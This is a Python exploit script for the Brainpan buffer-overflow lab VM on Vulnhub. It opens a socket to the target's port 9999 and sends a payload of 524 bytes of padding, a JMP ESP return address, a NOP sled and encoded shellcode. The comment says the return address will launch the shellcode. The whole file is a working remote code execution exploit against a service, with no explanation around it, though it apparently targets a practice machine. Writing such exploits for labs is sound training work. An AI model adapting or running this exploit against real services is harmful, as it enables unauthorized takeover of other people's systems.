# Buffer overflow exploit for Brainpan on Vulnhub
import socket
import time

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.98', 9999)) # IP for brainpan VM

junk = "\x41"*524
eip = "\xf3\x12\x17\x31" # Address for JMP ESP which will launch the shell code
nops = "\x90" * 48
buf =  ""
buf += "\xd9\xf7\xd9\x74\x24\xf4\xbd\x99\xbd\x25\x2b\x5e\x2b"
buf += "\xc9\xb1\x12\x31\x6e\x17\x83\xc6\x04\x03\xf7\xae\xc7"
buf += "\xde\x36\x0a\xf0\xc2\x6b\xef\xac\x6e\x89\x66\xb3\xdf"
buf += "\xeb\xb5\xb4\xb3\xaa\xf5\x8a\x7e\xcc\xbf\x8d\x79\xa4"
buf += "\xff\xc6\x7b\x6c\x68\x15\x7c\x88\xba\x90\x9d\x20\x5c"
buf += "\xf3\x0c\x13\x12\xf0\x27\x72\x99\x77\x65\x1c\x4c\x57"
buf += "\xf9\xb4\xf8\x88\xd2\x26\x90\x5f\xcf\xf4\x31\xe9\xf1"
buf += "\x48\xbe\x24\x71"

payload = junk + eip + nops + buf
s.send(payload)
print("sent {}".format(len(payload)))
s.close()
